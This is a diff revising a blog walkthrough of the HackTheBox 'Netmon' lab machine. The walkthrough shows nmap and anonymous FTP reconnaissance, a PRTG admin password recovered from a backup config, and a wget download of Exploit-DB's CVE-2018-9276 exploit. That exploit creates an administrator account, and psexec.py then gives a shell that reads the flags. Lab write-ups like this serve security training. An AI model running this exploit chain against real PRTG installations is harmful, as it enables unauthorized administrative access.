@@ -7,10 +7,8 @@ tags: [authenticated rce, ftp, network monitor, PRTG, rce]
 ---
 
 ## Information
-Netmon is an easy Windows box that is available on HackTheBox that aims to RCE via Powershell on a PRTG Network 
-Monitor. This machine has several possible solutions; from a reverse shell to a Powershell code execution from PRTG 
-Network Monitor itself. I've solved the root with `CVE-2018-9276`; an authenticated remote code execution, to solve the 
-box.
+Netmon is a Windows box that is on HackTheBox. This machine has several ways to achieve the given secondary task; from 
+a reverse shell to a Powershell RCE within PRTG Network Monitor.
 
 ## Tasks
 - Find the user password
@@ -19,25 +17,15 @@ box.
 ## Summary
 - Use `nmap` to see the services
 - Use `ncftp` to navigate through its `FTP`
-- Login to the PRTG Network Manager panel
-- Use `CVE-2018-9276` to create a new administrator in the system
-- Get shell via `psexec.py`
+- Login to the PRTG Network Manager panel to use `CVE-2018-9276` to create a new administrator in the system
+- Login to the system with the new credentials via `psexec.py`
  
-## Tools Used
-- `nmap`
-- `ncftp`
-- `searchsploit`
-- `psexec.py`
-
 ## Walkthrough
 ### nmap
 First, we begin with a standard `nmap` scan.
 
 ```
 $ nmap -sC -sV 10.10.10.152
-
-[...]
-
 PORT    STATE SERVICE      VERSION
 21/tcp  open  ftp          Microsoft ftpd
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -59,16 +47,17 @@ PORT    STATE SERVICE      VERSION
 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
 445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
-
-[...]
 ```
 
-The scan tells us that there is `HTTP` on Port 80 and `FTP` on Port 21 which we can login to it anonymously.
+The scan tells us that there is `HTTP` on Port 80 with PRTG Network Monitor installed on it and `FTP` on Port 21 
+which we can login to it anonymously.
 
 ### User Flag
 Let's take a look at the `FTP` by logging in anonymously.
 
 ```
+$ ncftp 10.10.10.152
+
 ncftp / > ls -la
 02-03-19  12:18AM                 1024 .rnd
 02-25-19  10:15PM       <DIR>          inetpub
@@ -79,6 +68,7 @@ ncftp / > ls -la
 02-25-19  11:49PM       <DIR>          Windows
 
 ncftp / > cd Users/
+
 ncftp /Users > ls -la
 02-25-19  11:44PM       <DIR>          Administrator
 02-03-19  12:35AM       <DIR>          Public
@@ -97,11 +87,11 @@ ncftp /Users/Public > cat user.txt
 dd58ce67b49e15105e88096c8d9255a5
 ```
 
-The user flag was stored in `C:/Users/Public` in `user.txt`; where it was accessible to everyone to see.
+Thus we've captured the user flag with relative ease.
 
 ### Root Flag
 #### Logging in to PRTG Network Monitor
-Taking a look at the `HTTP` service, we are greeted with a login page for PRTG Network Monitor.
+Taking a look at the `HTTP` service, we're greeted with a login page for PRTG Network Monitor.
 
 ![PRTG Mainscreen][PRTG Mainscreen]
 
@@ -150,7 +140,7 @@ ncftp ...r/PRTG Network Monitor > ls -la
 
 Taking a look at `PRTG Configuration.dat` didn't reveal as much as expected since it had the password encrypted/hashed. 
 
-```
+```html
 <login>
     prtgadmin
 </login>
@@ -176,37 +166,35 @@ Taking a look at `PRTG Configuration.dat` didn't reveal as much as expected sinc
 `PRTG Configuration.old` was similar to `PRTG Configuration.dat`, but `PRTG Configuration.old.bak` wasn't like the rest.
 The data on it was readable, most notably `<dbpassword>` segment which had a username and a password; `PrTg@dmin2018`.
 
-```
+```html
 <dbpassword>
     <!-- User: prtgadmin -->
     PrTg@dmin2018
 </dbpassword>
 ```
 
-Trying to login using this password didn't work. Since it is a year old backup, changing `PrTg@dmin2018`'s 8 to a 9 
-trying again worked, granting us access to the PRTG Network Manager panel.
+Trying to login using this password doesn't work. Since it's a year old backup, changing `PrTg@dmin2018`'s 8 to a 9 
+and then trying again works, granting us access to the PRTG Network Manager panel.
 
 ![PRTG Panel][PRTG Panel]
 
-#### CVE-2018-9276
+#### Exploiting PRTG
 At the very bottom of the PRTG Network Manager panel there is a version number; `18.1.37.13946`. Taking that to account, 
-running `searchsploit PRTG` revealed several exploits; most notably an authenticated remote code execution for version 
-`18.2.38`.
+running `searchsploit PRTG` reveals several exploits; most notably an authenticated remote code execution; or better 
+known as `CVE-2018-9276`.
 
 ```
 $ searchsploit PRTG
-
 -------------------------------------------------------------------------------
 Exploit Title
 -------------------------------------------------------------------------------
-PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution
+PRTG Network Monitor < 18.2.38 - (Authenticated) Remote Code Execution
 PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)
 PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting
 -------------------------------------------------------------------------------
 ```
 
-Taking a look at the actual code for the exploit over at [Github][Github] tells us that it works for `< 18.2.39`, while 
-[Exploit-DB][Exploit-DB] tells us how to use the exploit.
+Taking a look at [Exploit-DB][Exploit-DB] tells us how to use the exploit.
 
 ```
 EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
@@ -221,25 +209,6 @@ $ wget https://www.exploit-db.com/download/46527
 $ sed -i -e 's/\r$//' 46527
 
 $ ./46527 -u http://10.10.10.152 -c "OCTOPUS1813713946=ezk4RkMxM0M4LTkxMzYtNEVDOS1CODgwLTc4OUY5QjJERjJFN30%3D; _gat=1"
-
-[+]#########################################################################[+]
-[*] Authenticated PRTG Network Monitor remote code execution                [*]
-[+]#########################################################################[+]
-[*] Date: 11/03/2019                                                        [*]
-[+]#########################################################################[+]
-[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*]
-[+]#########################################################################[+]
-[*] Vendor Homepage: https://www.paessler.com/prtg                          [*]
-[*] Version: 18.2.38                                                        [*]
-[*] CVE: CVE-2018-9276                                                      [*]
-[*] Reference: https://www.codewatch.org/blog/?p=453                        [*]
-[+]#########################################################################[+]
-
-# login to the app, default creds are prtgadmin/prtgadmin. once authenticated grab your cookie and use it with the script.
-# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'
-
-[+]#########################################################################[+]
-
 [*] file created
 [*] sending notification wait....
 
@@ -258,26 +227,9 @@ from `impacket` we can get a shell and login as `pentest` to get our root flag.
 ```
 $ /usr/share/doc/python-impacket/examples/psexec.py pentest:'P3nT3st!'@10.10.10.152
 
-Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
-
-[*] Requesting shares on 10.10.10.152.....
-[*] Found writable share ADMIN$
-[*] Uploading file ySyxZytT.exe
-[*] Opening SVCManager on 10.10.10.152.....
-[*] Creating service Sjns on 10.10.10.152.....
-[*] Starting service Sjns.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-
 C:\Windows\system32> cd C:\Users\Administrator\
 
 C:\Users\Administrator> dir
-Volume in drive C has no label.
-Volume Serial Number is 684B-9CE8
-
-Directory of C:\Users\Administrator
-
 02/25/2019  11:58 PM    <DIR>          .
 02/25/2019  11:58 PM    <DIR>          ..
 02/03/2019  08:08 AM    <DIR>          Contacts
@@ -291,28 +243,20 @@ Directory of C:\Users\Administrator
 02/03/2019  08:08 AM    <DIR>          Saved Games
 02/03/2019  08:08 AM    <DIR>          Searches
 02/25/2019  11:06 PM    <DIR>          Videos
-               0 File(s)              0 bytes
-              13 Dir(s)  11,884,199,936 bytes free
 
 C:\Users\Administrator> cd Desktop
 
 C:\Users\Administrator\Desktop> dir
-Volume in drive C has no label.
-Volume Serial Number is 684B-9CE8
-
-Directory of C:\Users\Administrator\Desktop
-
 02/03/2019  12:35 AM    <DIR>          .
 02/03/2019  12:35 AM    <DIR>          ..
 02/03/2019  12:35 AM                33 root.txt
-               1 File(s)             33 bytes
-               2 Dir(s)  11,884,199,936 bytes free
 
 C:\Users\Administrator\Desktop> type root.txt
 3018977fb944bf1878f75b879fba67cc
 ```
 
-[PRTG Mainscreen]:      /images/posts/2019-07-01-htb-netmon/PRTG%20Mainscreen.png
-[PRTG Panel]:           /images/posts/2019-07-01-htb-netmon/PRTG%20Panel.png
-[Github]:               https://github.com/M4LV0/PRTG-Network-Monitor-RCE
-[Exploit-DB]:           https://www.exploit-db.com/exploits/46527
+Thus, we've captured the root flag.
+
+[PRTG Mainscreen]:  /images/posts/2019-07-01-htb-netmon/PRTG%20Mainscreen.png
+[PRTG Panel]:       /images/posts/2019-07-01-htb-netmon/PRTG%20Panel.png
+[Exploit-DB]:       https://www.exploit-db.com/exploits/46527
